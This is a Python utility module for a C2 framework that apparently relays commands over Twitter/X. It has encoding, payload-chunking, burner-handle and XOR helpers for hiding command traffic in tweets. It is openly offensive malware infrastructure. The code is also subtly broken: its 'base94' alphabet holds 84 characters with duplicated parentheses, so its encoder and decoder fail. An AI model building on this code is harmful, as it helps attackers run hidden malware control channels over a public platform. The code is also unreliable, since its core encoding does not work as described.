# c2_frameworks/twitter/utils.py
"""
Shared utilities for Twitter/X C2 framework
- Base94 encoding (tweet-safe)
- Steganography helpers
- Session management
"""

import base64
import hashlib
import random
import string
import time
from typing import Dict, List

# Tweet-safe alphabet (no URL encoding needed)
BASE94_CHARS = string.ascii_letters + string.digits + "-_~.!*'(),;:@$/()[]{}|"

def base94_encode(data: bytes) -> str:
    """Encode bytes to base94 using only tweet/DM-safe characters"""
    num = int.from_bytes(data, "big")
    if num == 0:
        return BASE94_CHARS[0]
    
    encoded = []
    while num:
        num, rem = divmod(num, 94)
        encoded.append(BASE94_CHARS[rem])
    return "".join(reversed(encoded))

def base94_decode(s: str) -> bytes:
    """Decode base94 string back to bytes"""
    num = 0
    for c in s:
        num = num * 94 + BASE94_CHARS.index(c)
    byte_length = (num.bit_length() + 7) // 8
    return num.to_bytes(byte_length or 1, "big")

def chunk_payload(payload: str, max_len: int = 270) -> List[str]:
    """Split large payload into tweet-sized chunks with sequencing"""
    chunks = [payload[i:i+max_len] for i in range(0, len(payload), max_len)]
    return [f"{i+1}/{len(chunks)}:{chunk}" for i, chunk in enumerate(chunks)]

def generate_handle() -> str:
    """Generate realistic-looking burner handle"""
    adjectives = ["silent", "ghost", "void", "shadow", "crypto", "zero", "dark", "neon"]
    nouns = ["wolf", "phoenix", "raven", "fox", "byte", "storm", "haze", "echo"]
    num = random.randint(10, 9999)
    return f"@{random.choice(adjectives)}_{random.choice(nouns)}_{num}"

def xor_encrypt(data: bytes, key: bytes) -> bytes:
    """Simple repeating-key XOR – good enough for stego"""
    return bytes(a ^ b for a, b in zip(data, key * (len(data) // len(key) + 1)))

def generate_task_id() -> str:
    return hashlib.sha256(str(time.time()).encode()).hexdigest()[:12]